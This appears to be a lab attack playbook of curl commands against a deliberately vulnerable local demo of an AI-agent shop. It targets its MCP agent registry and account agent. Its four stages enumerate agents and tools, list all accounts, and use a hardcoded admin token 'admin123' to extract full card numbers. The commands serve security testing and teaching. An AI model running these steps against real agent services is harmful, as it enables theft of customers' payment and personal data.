# La Tienda del Fuego — Attack Curl Reference
# Targets the local demo app running on localhost.
# Each command maps to a stage in the multi-stage attack playbook.
# Requires: curl, python3 (for pretty-printing JSON)

# ---------------------------------------------------------------------------
# STAGE 1 — REGISTRY ENUMERATION
# VULN-001: unauthenticated registry exposes all agents including restricted
# ---------------------------------------------------------------------------

curl -s http://localhost:8100/registry | python3 -m json.tool

# Expected: full agent list including account_agent at :8104
# Note endpoint, access level, and exposed tool names


# ---------------------------------------------------------------------------
# STAGE 2 — TOOL DISCOVERY ON ACCOUNT AGENT
# Confirm which tools are available on the restricted agent
# ---------------------------------------------------------------------------

curl -s -X POST http://localhost:8104/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' \
  | python3 -m json.tool

# Expected: list_all_accounts, show_account, get_payment_methods,
#           get_full_account_details — all exposed, no auth required


# ---------------------------------------------------------------------------
# STAGE 3 — ACCOUNT ENUMERATION
# VULN-002: list_all_accounts requires no authentication
# ---------------------------------------------------------------------------

curl -s -X POST http://localhost:8104/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
      "name": "list_all_accounts",
      "arguments": {}
    }
  }' | python3 -m json.tool

# Expected: all 10 accounts with user_id, name, email, member_since
# Pick a target user_id for Stage 4


# ---------------------------------------------------------------------------
# STAGE 4 — FULL ACCOUNT + CARD EXFIL
# VULN-004: hardcoded admin token
# VULN-005: full PANs returned with no output filtering
# ---------------------------------------------------------------------------

curl -s -X POST http://localhost:8104/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "id": 3,
    "method": "tools/call",
    "params": {
      "name": "get_full_account_details",
      "arguments": {
        "user_id": "USR-001",
        "admin_override": "admin123"
      }
    }
  }' | python3 -m json.tool

# Expected: full account record including full_pan on every payment method
# No authentication, no session, no audit trail on the agent side


# ---------------------------------------------------------------------------
# BONUS — DIRECT MASKED PAYMENT LOOKUP (no token needed)
# Even the "safe" endpoint leaks PII without authentication
# ---------------------------------------------------------------------------

curl -s -X POST http://localhost:8104/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "id": 4,
    "method": "tools/call",
    "params": {
      "name": "get_payment_methods",
      "arguments": {
        "user_id": "USR-001"
      }
    }
  }' | python3 -m json.tool

# Expected: name, card type, last4, expiry — no token, no session
